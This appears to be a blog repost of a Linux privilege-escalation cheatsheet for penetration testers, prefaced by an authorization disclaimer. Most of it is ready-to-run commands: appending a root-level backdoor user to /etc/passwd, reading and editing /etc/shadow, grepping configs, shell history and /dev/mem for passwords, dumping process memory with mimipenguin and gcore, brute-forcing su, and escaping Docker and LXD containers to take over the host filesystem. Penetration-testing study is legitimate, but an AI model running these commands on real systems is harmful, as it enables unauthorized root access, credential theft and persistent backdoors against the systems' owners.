---
layout: post
title: "Linux Privilege Escalation: A Comprehensive Exploitation Guide (Cheatsheet)"
date: 2026-02-02 16:59:59 +0000
categories: [Linux]
tags: [linux, privilege-escalation, system-security, credential-security, container-security]
description: "A Linux privilege-escalation cheatsheet covering permission weaknesses, credential exposure, process memory, and container misconfigurations."
---

> Use these techniques only on systems you own or are explicitly authorized to assess. Perform testing in isolated labs and follow the applicable rules of engagement.

## Weak File Permissions

### Readable `/etc/shadow`

If you can read `/etc/shadow`, you have several options:

- **Crack password hashes** using tools like John the Ripper or Hashcat.
- **Modify a hash** to set a known password.
- **Edit the shadow file** directly to replace or remove password hashes.

### Writable `/etc/passwd`

In older Linux systems or misconfigured environments, `/etc/passwd` may contain password hashes or be world-writable.

**Generate a password hash:**

```bash
mkpasswd -m SHA-512 hacker
```

**Add a new root user:**

```bash
echo 'hacker:GENERATED_PASSWORD_HASH:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
```

Then authenticate with:

```bash
su hacker
```

**Create a user with no password:**

```bash
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

### Writable executables with SUID or sudo rights

If you can modify executables located in `$PATH` or a directory with sudo privileges:

- **Overwrite the binary** with malicious code, such as a shell script, Python program, or compiled C program.
- Replace it with a shell spawner to gain elevated privileges.

## Credential Hunting

### Insecure password storage

Many services store credentials in plaintext configuration files:

- **MySQL:** Check `config.php`, `wp-config.php`, or similar files.
- **SSH:** Look for private keys or `ssh_config` files.
- **Generic:** Search `.cfg`, `.conf`, `.ini`, and `.xml` files that may contain credentials.

**Example search:**

```bash
find / -name "*.cfg" 2>/dev/null | xargs grep -i "password"
```

### Backup files

Backup files can contain sensitive information:

```bash
find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null
```

### Command history

Users sometimes pass passwords as command-line arguments:

```bash
history | grep -i -E '\-p|\-pass|\-password|:.*@|passw'
cat ~/.bash_history | grep -i -E 'password|passwd|pwd'
```

### Search the filesystem

```bash
grep -r -i "password" /home /var/www /opt 2>/dev/null
```

## Memory and Process Exploitation

### Memory dump with Mimipenguin

Mimipenguin can extract credentials from memory on Linux systems:

```bash
git clone https://github.com/huntergregal/mimipenguin
cd mimipenguin
./mimipenguin.sh
```

### Process dump

**Locate the target process:**

```bash
ps -ef | grep "authenticator"
```

**Using `gcore`:**

```bash
gcore <PID>
strings core* | grep -i pass
```

**Using `procdump`:**

```bash
procdump -p <PID> -o dump.txt
cat dump.txt | grep -i "password"
```

### Sudo password brute force

The original article demonstrates `su-bruteforce`:

```bash
git clone https://github.com/carlospolop/su-bruteforce
./suBF.sh -u root -w passwords.txt -t 0.5 -s 0.003
```

### `/dev/mem` search

Accessing physical memory directly requires root or specific permissions:

```bash
strings /dev/mem | grep -i password
```

## Container Escape Techniques

### Docker privilege escalation

If you are in a Docker container with the Docker socket mounted or have Docker privileges on the host, the article demonstrates mounting the host filesystem:

```bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This gives root inside the container with access to the host filesystem. The article then demonstrates editing sensitive files:

```bash
nano /mnt/etc/shadow
nano /mnt/etc/passwd
```

### LXD/LXC privilege escalation

Membership in the `lxd` or `lxc` group can allow privilege escalation.

**On the machine building the Alpine image:**

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine
```

If the required directory is missing, create it:

```bash
mkdir /rootfs/usr/share/alpine-mirrors
```

Transfer the generated `.tar.gz` file to the target machine using an authorized method, such as `scp`.

**On the target machine:**

```bash
lxd init
lxc image list
lxc image import ./alpine-*.tar.gz --alias hacked
lxc init hacked hacked-container -c security.privileged=true
lxc config device add hacked-container mydevice disk source=/ path=/mnt/root recursive=true
lxc start hacked-container
lxc exec hacked-container /bin/sh
```

Inside the container, the original article demonstrates access to the host filesystem:

```bash
cd /mnt/root
cat etc/shadow
```

It also describes modifying `/mnt/root/etc/shadow` or `/mnt/root/etc/passwd` to add a backdoor user.

---

*Originally published on [Medium](https://medium.com/@maram.raboudi/linux-privilege-escalation-a-comprehensive-exploitation-guide-cheatsheet-941cbd60c654).*
